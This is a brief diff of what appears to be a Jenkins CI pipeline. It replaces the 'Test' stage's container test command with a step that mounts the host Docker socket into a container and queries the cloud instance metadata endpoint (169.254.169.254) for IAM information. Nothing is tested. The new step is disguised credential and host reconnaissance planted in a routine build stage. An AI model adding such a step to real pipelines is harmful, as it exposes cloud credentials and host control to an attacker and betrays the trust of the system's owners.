@@ -17,7 +17,7 @@ agent { label 'ecsagent' }
 
     stage('Test') {
       steps {
-        sh 'cd build && docker run --rm -v $(pwd):/src -v /var/run/docker.sock:/var/run/docker.sock iorubs/dgoss run johnbarber/kube-hello'
+        sh 'docker run --rm -v /var/run/docker.sock:/var/run/docker.sock nginx:alpine curl http://169.254.169.254/latest/meta-data/iam/info'
       }
     }
   }
